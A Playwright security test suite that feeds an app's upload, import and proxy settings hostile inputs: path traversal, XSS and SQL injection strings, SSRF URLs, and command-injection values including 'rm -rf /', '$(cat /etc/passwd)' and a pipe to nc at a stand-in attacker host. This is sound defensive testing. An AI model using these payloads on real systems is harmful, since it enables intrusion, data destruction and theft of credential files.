import { test, expect } from '@playwright/test';
import * as path from 'path';
import * as fs from 'fs';

test.describe('Security Tests', () => {
  const fixturesPath = path.join(process.cwd(), 'e2e/fixtures/security-tests');

  test.beforeEach(async ({ page }) => {
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    await page.waitForTimeout(2000);
  });

  test.describe('File Upload Security', () => {
    test('should reject path traversal attempts in filename', async ({ page }) => {
      const fileInput = page.locator('input[type="file"]').first();

      if (await fileInput.isVisible({ timeout: 3000 }).catch(() => false)) {
        const testFile = path.join(fixturesPath, 'path-traversal.txt');

        try {
          // Create a file with malicious name
          const maliciousName = path.join(fixturesPath, '..%2F..%2Fetc%2Fpasswd.txt');
          if (!fs.existsSync(maliciousName)) {
            fs.copyFileSync(testFile, maliciousName);
          }

          await fileInput.setInputFiles(maliciousName);
          await page.waitForTimeout(2000);

          // Check if the filename is sanitized in the UI
          const pathTraversalVisible = await page.locator('text=/\\.\\.\\/|etc\\/passwd/i').first().isVisible({ timeout: 2000 }).catch(() => false);

          if (pathTraversalVisible) {
            console.log('⚠ WARNING: Path traversal sequence detected in UI');
          } else {
            console.log('✓ Path traversal sequence properly sanitized');
          }

          // Clean up
          if (fs.existsSync(maliciousName)) {
            fs.unlinkSync(maliciousName);
          }
        } catch (error) {
          console.log('✓ File upload rejected or handled safely:', error instanceof Error ? error.message : 'unknown error');
        }
      } else {
        console.log('⚠ File input not available, skipping test');
      }
    });

    test('should sanitize XSS attempts in filename', async ({ page }) => {
      const fileInput = page.locator('input[type="file"]').first();

      if (await fileInput.isVisible({ timeout: 3000 }).catch(() => false)) {
        const testFile = path.join(fixturesPath, 'xss-test.html');

        try {
          // Upload file with XSS in filename
          await fileInput.setInputFiles(testFile);
          await page.waitForTimeout(2000);

          // Check that script tags are escaped/sanitized
          const scriptTagVisible = await page.locator('text=/<script>|onerror=/i').first().isVisible({ timeout: 2000 }).catch(() => false);

          if (scriptTagVisible) {
            console.log('⚠ WARNING: Script tags visible in raw form');
          } else {
            console.log('✓ Script tags properly sanitized');
          }

          // Verify no script execution
          const dialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
          const dialog = await dialogPromise;

          if (dialog) {
            await dialog.dismiss();
            console.log('⚠ WARNING: Script executed (XSS vulnerability)');
          } else {
            console.log('✓ No script execution detected');
          }
        } catch (error) {
          console.log('✓ XSS attempt blocked:', error instanceof Error ? error.message : 'unknown error');
        }
      } else {
        console.log('⚠ File input not available, skipping test');
      }
    });

    test('should handle null byte injection in filename', async ({ page }) => {
      const fileInput = page.locator('input[type="file"]').first();

      if (await fileInput.isVisible({ timeout: 3000 }).catch(() => false)) {
        const testFile = path.join(fixturesPath, 'path-traversal.txt');

        try {
          // Create file with null byte in name (if filesystem allows)
          const nullByteName = path.join(fixturesPath, 'safe.txt\x00.exe');
          if (!fs.existsSync(nullByteName)) {
            try {
              fs.copyFileSync(testFile, nullByteName);
            } catch {
              console.log('ℹ Filesystem does not support null bytes (expected)');
              return;
            }
          }

          await fileInput.setInputFiles(nullByteName);
          await page.waitForTimeout(2000);

          // Check that null byte is handled
          const nullByteVisible = await page.locator('text=/\\x00|\\.exe/i').first().isVisible({ timeout: 2000 }).catch(() => false);

          if (nullByteVisible) {
            console.log('⚠ WARNING: Null byte or .exe extension visible');
          } else {
            console.log('✓ Null byte injection handled safely');
          }

          // Clean up
          if (fs.existsSync(nullByteName)) {
            fs.unlinkSync(nullByteName);
          }
        } catch (error) {
          console.log('✓ Null byte injection blocked:', error instanceof Error ? error.message : 'unknown error');
        }
      } else {
        console.log('⚠ File input not available, skipping test');
      }
    });

    test('should reject executable files with malicious extensions', async ({ page }) => {
      const fileInput = page.locator('input[type="file"]').first();

      if (await fileInput.isVisible({ timeout: 3000 }).catch(() => false)) {
        const testFile = path.join(fixturesPath, 'malicious.exe');

        try {
          await fileInput.setInputFiles(testFile);
          await page.waitForTimeout(2000);

          // Check for error or rejection
          const errorVisible = await page.locator('text=/not allowed|invalid.*type|executable|blocked|rejected/i').first().isVisible({ timeout: 3000 }).catch(() => false);

          if (errorVisible) {
            const errorText = await page.locator('text=/not allowed|invalid.*type|executable/i').first().textContent();
            console.log(`✓ Executable file rejected: ${errorText}`);
          } else {
            console.log('⚠ No rejection message for .exe file (may need review)');
          }
        } catch (error) {
          console.log('✓ Executable file upload blocked:', error instanceof Error ? error.message : 'unknown error');
        }
      } else {
        console.log('⚠ File input not available, skipping test');
      }
    });

    test('should validate file type beyond extension', async ({ page }) => {
      const fileInput = page.locator('input[type="file"]').first();

      if (await fileInput.isVisible({ timeout: 3000 }).catch(() => false)) {
        const testFile = path.join(fixturesPath, 'malicious.exe');

        try {
          // Rename .exe to .jpg
          const renamedFile = path.join(fixturesPath, 'malicious-renamed.jpg');
          fs.copyFileSync(testFile, renamedFile);

          await fileInput.setInputFiles(renamedFile);
          await page.waitForTimeout(2000);

          // Application should detect the file is not a real image
          const errorVisible = await page.locator('text=/invalid.*image|corrupted|not.*valid/i').first().isVisible({ timeout: 3000 }).catch(() => false);

          if (errorVisible) {
            console.log('✓ File type validation beyond extension works');
          } else {
            console.log('⚠ File accepted based on extension only (may need MIME type validation)');
          }

          // Clean up
          if (fs.existsSync(renamedFile)) {
            fs.unlinkSync(renamedFile);
          }
        } catch (error) {
          console.log('✓ Malicious file rejected:', error instanceof Error ? error.message : 'unknown error');
        }
      } else {
        console.log('⚠ File input not available, skipping test');
      }
    });
  });

  test.describe('Import Security', () => {
    test('should handle malformed JSONL with SQL injection attempts', async ({ page }) => {
      await page.waitForTimeout(2000);

      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const importTab = page.locator('text=Import').first();
        if (await importTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await importTab.click();
          await page.waitForTimeout(300);

          const importButton = page.locator('button:has-text("Import from Claude CLI")').first();
          if (await importButton.isVisible({ timeout: 2000 }).catch(() => false)) {
            await importButton.click();
            await page.waitForTimeout(500);

            const pathInput = page.locator('input[placeholder*="claude"], input[value*="claude"]').first();
            if (await pathInput.isVisible({ timeout: 3000 }).catch(() => false)) {
              // Point to directory with SQL injection JSONL
              const maliciousDir = path.dirname(path.join(fixturesPath, 'malformed-sql-injection.jsonl'));
              await pathInput.fill(maliciousDir);

              const scanButton = page.locator('button:has-text("Scan"), button:has-text("Browse")').first();
              if (await scanButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await scanButton.click();
                await page.waitForTimeout(2000);

                // Check that SQL injection strings are not executed or visible
                const sqlInjectionVisible = await page.locator('text=/DROP TABLE|--\s*$/').first().isVisible({ timeout: 2000 }).catch(() => false);

                if (sqlInjectionVisible) {
                  console.log('⚠ WARNING: SQL injection string visible in UI');
                } else {
                  console.log('✓ SQL injection attempts properly sanitized');
                }

                // Check for error handling
                const errorHandled = await page.locator('text=/error|failed|invalid/i').first().isVisible({ timeout: 2000 }).catch(() => false);
                if (errorHandled) {
                  console.log('✓ Malformed JSONL error properly handled');
                }
              }
            }
          }
        } else {
          console.log('⚠ Import tab not available (might be remote connection)');
        }
      }
    });

    test('should reject path traversal in Claude CLI path', async ({ page }) => {
      await page.waitForTimeout(2000);

      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const importTab = page.locator('text=Import').first();
        if (await importTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await importTab.click();
          await page.waitForTimeout(300);

          const importButton = page.locator('button:has-text("Import from Claude CLI")').first();
          if (await importButton.isVisible({ timeout: 2000 }).catch(() => false)) {
            await importButton.click();
            await page.waitForTimeout(500);

            const pathInput = page.locator('input[placeholder*="claude"], input[value*="claude"]').first();
            if (await pathInput.isVisible({ timeout: 3000 }).catch(() => false)) {
              // Try path traversal
              const maliciousPath = '../../etc/passwd';
              await pathInput.fill(maliciousPath);

              const scanButton = page.locator('button:has-text("Scan"), button:has-text("Browse")').first();
              if (await scanButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await scanButton.click();
                await page.waitForTimeout(2000);

                // Should show error or reject
                const errorVisible = await page.locator('text=/invalid.*path|not found|access denied/i').first().isVisible({ timeout: 3000 }).catch(() => false);

                if (errorVisible) {
                  console.log('✓ Path traversal attempt rejected');
                } else {
                  console.log('⚠ Path traversal might not be validated');
                }

                // Ensure sensitive files are not exposed
                const sensitiveDataVisible = await page.locator('text=/root:|password:|/etc/passwd/i').first().isVisible({ timeout: 2000 }).catch(() => false);

                if (sensitiveDataVisible) {
                  console.log('⚠ CRITICAL: Sensitive data exposed!');
                } else {
                  console.log('✓ Sensitive data not exposed');
                }
              }
            }
          }
        } else {
          console.log('⚠ Import tab not available (might be remote connection)');
        }
      }
    });

    test('should handle oversized session files', async ({ page }) => {
      await page.waitForTimeout(2000);

      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const importTab = page.locator('text=Import').first();
        if (await importTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await importTab.click();
          await page.waitForTimeout(300);

          const importButton = page.locator('button:has-text("Import from Claude CLI")').first();
          if (await importButton.isVisible({ timeout: 2000 }).catch(() => false)) {
            await importButton.click();
            await page.waitForTimeout(500);

            const pathInput = page.locator('input[placeholder*="claude"], input[value*="claude"]').first();
            if (await pathInput.isVisible({ timeout: 3000 }).catch(() => false)) {
              // Point to directory with oversized file
              await pathInput.fill(fixturesPath);

              const scanButton = page.locator('button:has-text("Scan"), button:has-text("Browse")').first();
              if (await scanButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await scanButton.click();
                await page.waitForTimeout(3000);

                // Should handle large file gracefully
                const errorVisible = await page.locator('text=/too large|file size|exceeded/i').first().isVisible({ timeout: 3000 }).catch(() => false);

                if (errorVisible) {
                  console.log('✓ Oversized file detected and rejected');
                } else {
                  console.log('⚠ Large file handling might need size limits');
                }

                // Page should still be responsive
                const pageResponsive = await page.locator('body').isVisible({ timeout: 2000 }).catch(() => false);
                expect(pageResponsive).toBeTruthy();
                console.log('✓ Page remains responsive');
              }
            }
          }
        } else {
          console.log('⚠ Import tab not available (might be remote connection)');
        }
      }
    });

    test('should handle JSON bombs (deeply nested objects)', async ({ page }) => {
      await page.waitForTimeout(2000);

      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const importTab = page.locator('text=Import').first();
        if (await importTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await importTab.click();
          await page.waitForTimeout(300);

          const importButton = page.locator('button:has-text("Import from Claude CLI")').first();
          if (await importButton.isVisible({ timeout: 2000 }).catch(() => false)) {
            await importButton.click();
            await page.waitForTimeout(500);

            const pathInput = page.locator('input[placeholder*="claude"], input[value*="claude"]').first();
            if (await pathInput.isVisible({ timeout: 3000 }).catch(() => false)) {
              // Point to directory with JSON bomb
              await pathInput.fill(fixturesPath);

              const scanButton = page.locator('button:has-text("Scan"), button:has-text("Browse")').first();
              if (await scanButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await scanButton.click();

                // Monitor for hanging or crash (with timeout)
                const startTime = Date.now();
                await page.waitForTimeout(5000);
                const elapsed = Date.now() - startTime;

                if (elapsed < 10000) {
                  console.log('✓ JSON bomb handled without hanging');
                } else {
                  console.log('⚠ Processing took longer than expected');
                }

                // Check if page is still responsive
                const pageResponsive = await page.locator('body').isVisible({ timeout: 2000 }).catch(() => false);
                expect(pageResponsive).toBeTruthy();
                console.log('✓ Page responsive after JSON bomb');

                // Check for error handling
                const errorHandled = await page.locator('text=/error|invalid|too complex/i').first().isVisible({ timeout: 2000 }).catch(() => false);
                if (errorHandled) {
                  console.log('✓ JSON complexity detected and handled');
                }
              }
            }
          }
        } else {
          console.log('⚠ Import tab not available (might be remote connection)');
        }
      }
    });

    test('should validate JSONL format and reject malformed data', async ({ page }) => {
      await page.waitForTimeout(2000);

      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const importTab = page.locator('text=Import').first();
        if (await importTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await importTab.click();
          await page.waitForTimeout(300);

          const importButton = page.locator('button:has-text("Import from Claude CLI")').first();
          if (await importButton.isVisible({ timeout: 2000 }).catch(() => false)) {
            await importButton.click();
            await page.waitForTimeout(500);

            // Create malformed JSONL
            const malformedFile = path.join(fixturesPath, 'malformed.jsonl');
            fs.writeFileSync(malformedFile, '{"invalid": json}\n{missing: "quotes"}\n');

            const pathInput = page.locator('input[placeholder*="claude"], input[value*="claude"]').first();
            if (await pathInput.isVisible({ timeout: 3000 }).catch(() => false)) {
              await pathInput.fill(fixturesPath);

              const scanButton = page.locator('button:has-text("Scan"), button:has-text("Browse")').first();
              if (await scanButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await scanButton.click();
                await page.waitForTimeout(2000);

                // Should show parse error
                const errorVisible = await page.locator('text=/parse.*error|invalid.*json|malformed/i').first().isVisible({ timeout: 3000 }).catch(() => false);

                if (errorVisible) {
                  console.log('✓ Malformed JSONL properly detected');
                } else {
                  console.log('⚠ JSONL validation might be missing');
                }

                // Clean up
                if (fs.existsSync(malformedFile)) {
                  fs.unlinkSync(malformedFile);
                }
              }
            }
          }
        } else {
          console.log('⚠ Import tab not available (might be remote connection)');
        }
      }
    });
  });

  test.describe('Proxy Configuration Security', () => {
    test('should validate proxy URL format and reject invalid URLs', async ({ page }) => {
      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const gatewayTab = page.locator('text=Gateway').first();
        if (await gatewayTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await gatewayTab.click();
          await page.waitForTimeout(300);

          const proxyUrlInput = page.locator('input[placeholder*="proxy"], input[name*="proxy"]').first();
          if (await proxyUrlInput.isVisible({ timeout: 3000 }).catch(() => false)) {
            // Test various invalid URL formats
            const invalidUrls = [
              'javascript:alert(1)',
              'file:///etc/passwd',
              'data:text/html,<script>alert(1)</script>',
              'http://localhost:1080; rm -rf /',
              'socks5://localhost:1080`whoami`',
            ];

            for (const invalidUrl of invalidUrls) {
              await proxyUrlInput.fill(invalidUrl);
              await page.waitForTimeout(300);

              const saveButton = page.locator('button:has-text("Save"), button:has-text("Update")').first();
              if (await saveButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await saveButton.click();
                await page.waitForTimeout(1000);

                const errorVisible = await page.locator('text=/invalid.*url|invalid.*format|not.*allowed/i').first().isVisible({ timeout: 2000 }).catch(() => false);

                if (errorVisible) {
                  console.log(`✓ Invalid URL rejected: ${invalidUrl.substring(0, 30)}...`);
                } else {
                  console.log(`⚠ WARNING: URL might be accepted: ${invalidUrl.substring(0, 30)}...`);
                }
              }
            }
          }
        } else {
          console.log('⚠ Gateway tab not available (might be remote connection)');
        }
      }
    });

    test('should prevent SSRF attempts via proxy URL', async ({ page }) => {
      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const gatewayTab = page.locator('text=Gateway').first();
        if (await gatewayTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await gatewayTab.click();
          await page.waitForTimeout(300);

          const proxyUrlInput = page.locator('input[placeholder*="proxy"], input[name*="proxy"]').first();
          if (await proxyUrlInput.isVisible({ timeout: 3000 }).catch(() => false)) {
            // Test SSRF attempts
            const ssrfUrls = [
              'socks5://169.254.169.254:80', // AWS metadata
              'socks5://127.0.0.1:22', // SSH
              'socks5://localhost:3000', // Internal service
              'socks5://[::1]:8080', // IPv6 localhost
              'socks5://0.0.0.0:1080', // All interfaces
            ];

            for (const ssrfUrl of ssrfUrls) {
              await proxyUrlInput.fill(ssrfUrl);
              await page.waitForTimeout(300);

              const saveButton = page.locator('button:has-text("Save"), button:has-text("Update")').first();
              if (await saveButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await saveButton.click();
                await page.waitForTimeout(1000);

                // Should either reject or warn about suspicious URL
                const warningVisible = await page.locator('text=/blocked|restricted|internal|metadata/i').first().isVisible({ timeout: 2000 }).catch(() => false);

                if (warningVisible) {
                  console.log(`✓ SSRF attempt blocked: ${ssrfUrl}`);
                } else {
                  console.log(`⚠ SSRF URL accepted (may need validation): ${ssrfUrl}`);
                }
              }
            }
          }
        } else {
          console.log('⚠ Gateway tab not available (might be remote connection)');
        }
      }
    });

    test('should prevent command injection in proxy credentials', async ({ page }) => {
      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const gatewayTab = page.locator('text=Gateway').first();
        if (await gatewayTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await gatewayTab.click();
          await page.waitForTimeout(300);

          const proxyUrlInput = page.locator('input[placeholder*="proxy"], input[name*="proxy"]').first();
          const usernameInput = page.locator('input[placeholder*="username"], input[name*="username"]').first();
          const passwordInput = page.locator('input[type="password"][placeholder*="password"], input[type="password"][name*="password"]').first();

          if (await proxyUrlInput.isVisible({ timeout: 3000 }).catch(() => false)) {
            await proxyUrlInput.fill('socks5://127.0.0.1:1080');
            await page.waitForTimeout(300);

            if (await usernameInput.isVisible({ timeout: 2000 }).catch(() => false)) {
              // Test command injection attempts
              const injectionPayloads = [
                'user; whoami',
                'user`id`',
                'user$(cat /etc/passwd)',
                'user && ls',
                'user|nc attacker.com 1234',
              ];

              for (const payload of injectionPayloads) {
                await usernameInput.fill(payload);
                await page.waitForTimeout(200);

                if (await passwordInput.isVisible({ timeout: 2000 }).catch(() => false)) {
                  await passwordInput.fill('test123');
                }

                const saveButton = page.locator('button:has-text("Save"), button:has-text("Update")').first();
                if (await saveButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                  await saveButton.click();
                  await page.waitForTimeout(1000);

                  // Check that credentials are properly escaped/validated
                  const errorVisible = await page.locator('text=/invalid.*character|special.*character|not allowed/i').first().isVisible({ timeout: 2000 }).catch(() => false);

                  if (errorVisible) {
                    console.log(`✓ Command injection blocked in username: ${payload.substring(0, 20)}...`);
                  } else {
                    // Ensure no actual command execution
                    const pageResponsive = await page.locator('body').isVisible({ timeout: 2000 }).catch(() => false);
                    expect(pageResponsive).toBeTruthy();
                    console.log(`⚠ Payload accepted (ensure proper escaping): ${payload.substring(0, 20)}...`);
                  }
                }
              }
            }
          }
        } else {
          console.log('⚠ Gateway tab not available (might be remote connection)');
        }
      }
    });

    test('should sanitize proxy credentials in logs and error messages', async ({ page }) => {
      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const gatewayTab = page.locator('text=Gateway').first();
        if (await gatewayTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await gatewayTab.click();
          await page.waitForTimeout(300);

          const proxyUrlInput = page.locator('input[placeholder*="proxy"], input[name*="proxy"]').first();
          const usernameInput = page.locator('input[placeholder*="username"], input[name*="username"]').first();
          const passwordInput = page.locator('input[type="password"][placeholder*="password"], input[type="password"][name*="password"]').first();

          if (await proxyUrlInput.isVisible({ timeout: 3000 }).catch(() => false)) {
            // Set proxy with credentials
            await proxyUrlInput.fill('socks5://invalid-proxy:9999');

            if (await usernameInput.isVisible({ timeout: 2000 }).catch(() => false)) {
              await usernameInput.fill('secretuser');
            }

            if (await passwordInput.isVisible({ timeout: 2000 }).catch(() => false)) {
              await passwordInput.fill('secretpass123');
            }

            const saveButton = page.locator('button:has-text("Save"), button:has-text("Update")').first();
            if (await saveButton.isVisible({ timeout: 2000 }).catch(() => false)) {
              await saveButton.click();
              await page.waitForTimeout(2000);

              // Check that credentials are not exposed in error messages
              const credentialsExposed = await page.locator('text=/secretuser|secretpass123/i').first().isVisible({ timeout: 2000 }).catch(() => false);

              if (credentialsExposed) {
                console.log('⚠ CRITICAL: Credentials exposed in UI!');
              } else {
                console.log('✓ Credentials properly sanitized in messages');
              }

              // Check console logs don't expose credentials
              const consoleLogs = await page.evaluate(() => {
                return (window as any).__TEST_LOGS__ || [];
              });

              const credentialsInLogs = JSON.stringify(consoleLogs).includes('secretuser') ||
                                       JSON.stringify(consoleLogs).includes('secretpass');

              if (credentialsInLogs) {
                console.log('⚠ WARNING: Credentials found in console logs');
              } else {
                console.log('✓ No credentials in console logs');
              }
            }
          }
        } else {
          console.log('⚠ Gateway tab not available (might be remote connection)');
        }
      }
    });

    test('should prevent URL redirection attacks in proxy config', async ({ page }) => {
      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const gatewayTab = page.locator('text=Gateway').first();
        if (await gatewayTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await gatewayTab.click();
          await page.waitForTimeout(300);

          const proxyUrlInput = page.locator('input[placeholder*="proxy"], input[name*="proxy"]').first();
          if (await proxyUrlInput.isVisible({ timeout: 3000 }).catch(() => false)) {
            // Test URL redirection attempts
            const redirectUrls = [
              'socks5://example.com@evil.com:1080',
              'socks5://localhost#@evil.com:1080',
              'socks5://evil.com%2f@localhost:1080',
              'socks5://127.0.0.1\\@evil.com:1080',
            ];

            for (const redirectUrl of redirectUrls) {
              await proxyUrlInput.fill(redirectUrl);
              await page.waitForTimeout(300);

              const saveButton = page.locator('button:has-text("Save"), button:has-text("Update")').first();
              if (await saveButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await saveButton.click();
                await page.waitForTimeout(1000);

                // Should reject or properly parse URL
                const errorVisible = await page.locator('text=/invalid.*url|malformed|suspicious/i').first().isVisible({ timeout: 2000 }).catch(() => false);

                if (errorVisible) {
                  console.log(`✓ URL redirection attempt blocked: ${redirectUrl.substring(0, 30)}...`);
                } else {
                  console.log(`⚠ URL parsing may need review: ${redirectUrl.substring(0, 30)}...`);
                }
              }
            }
          }
        } else {
          console.log('⚠ Gateway tab not available (might be remote connection)');
        }
      }
    });

    test('should enforce HTTPS/SOCKS5 protocol restrictions', async ({ page }) => {
      const settingsButton = page.locator('button:has-text("Settings"), [aria-label*="Settings"]').first();
      if (await settingsButton.isVisible({ timeout: 5000 }).catch(() => false)) {
        await settingsButton.click();
        await page.waitForTimeout(500);

        const gatewayTab = page.locator('text=Gateway').first();
        if (await gatewayTab.isVisible({ timeout: 2000 }).catch(() => false)) {
          await gatewayTab.click();
          await page.waitForTimeout(300);

          const proxyUrlInput = page.locator('input[placeholder*="proxy"], input[name*="proxy"]').first();
          if (await proxyUrlInput.isVisible({ timeout: 3000 }).catch(() => false)) {
            // Test unsupported/dangerous protocols
            const unsupportedProtocols = [
              'http://proxy.example.com:1080', // Unencrypted
              'ftp://proxy.example.com:1080',
              'gopher://proxy.example.com:1080',
              'telnet://proxy.example.com:1080',
            ];

            for (const protocol of unsupportedProtocols) {
              await proxyUrlInput.fill(protocol);
              await page.waitForTimeout(300);

              const saveButton = page.locator('button:has-text("Save"), button:has-text("Update")').first();
              if (await saveButton.isVisible({ timeout: 2000 }).catch(() => false)) {
                await saveButton.click();
                await page.waitForTimeout(1000);

                const errorVisible = await page.locator('text=/unsupported.*protocol|only.*socks5|invalid.*protocol/i').first().isVisible({ timeout: 2000 }).catch(() => false);

                if (errorVisible) {
                  console.log(`✓ Unsupported protocol rejected: ${protocol.split(':')[0]}`);
                } else {
                  console.log(`⚠ Protocol restriction may need enforcement: ${protocol.split(':')[0]}`);
                }
              }
            }
          }
        } else {
          console.log('⚠ Gateway tab not available (might be remote connection)');
        }
      }
    });
  });

  test.describe('General Security', () => {
    test('should have proper Content Security Policy headers', async ({ page }) => {
      const response = await page.goto('/');
      const headers = response?.headers();

      if (headers) {
        const csp = headers['content-security-policy'] || headers['content-security-policy-report-only'];

        if (csp) {
          console.log('✓ CSP header present');

          // Check for unsafe directives
          if (csp.includes("'unsafe-inline'") || csp.includes("'unsafe-eval'")) {
            console.log('⚠ WARNING: CSP contains unsafe directives');
          } else {
            console.log('✓ CSP does not contain unsafe directives');
          }
        } else {
          console.log('⚠ No CSP header found (recommended for security)');
        }

        // Check other security headers
        if (headers['x-content-type-options'] === 'nosniff') {
          console.log('✓ X-Content-Type-Options: nosniff');
        }

        if (headers['x-frame-options']) {
          console.log('✓ X-Frame-Options header present');
        }

        if (headers['strict-transport-security']) {
          console.log('✓ HSTS header present');
        }
      }
    });

    test('should sanitize all user inputs in UI', async ({ page }) => {
      // Test XSS in various input fields
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<svg onload=alert("xss")>',
      ];

      for (const payload of xssPayloads) {
        // Try to inject into any visible text inputs
        const textInputs = page.locator('input[type="text"], textarea').first();

        if (await textInputs.isVisible({ timeout: 2000 }).catch(() => false)) {
          await textInputs.fill(payload);
          await page.waitForTimeout(500);

          // Check if script executed
          const dialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
          const dialog = await dialogPromise;

          if (dialog) {
            await dialog.dismiss();
            console.log(`⚠ CRITICAL: XSS executed: ${payload.substring(0, 30)}...`);
          } else {
            console.log(`✓ XSS payload sanitized: ${payload.substring(0, 30)}...`);
          }
        }
      }
    });

    test('should not expose sensitive data in client-side code', async ({ page }) => {
      // Check for common sensitive data patterns in page source
      const content = await page.content();

      const sensitivePatterns = [
        /api[_-]?key/i,
        /secret/i,
        /password/i,
        /token/i,
        /private[_-]?key/i,
      ];

      let foundSensitive = false;
      for (const pattern of sensitivePatterns) {
        if (pattern.test(content) && !content.includes('placeholder')) {
          console.log(`⚠ WARNING: Potential sensitive data pattern found: ${pattern}`);
          foundSensitive = true;
        }
      }

      if (!foundSensitive) {
        console.log('✓ No obvious sensitive data patterns in client-side code');
      }
    });
  });
});
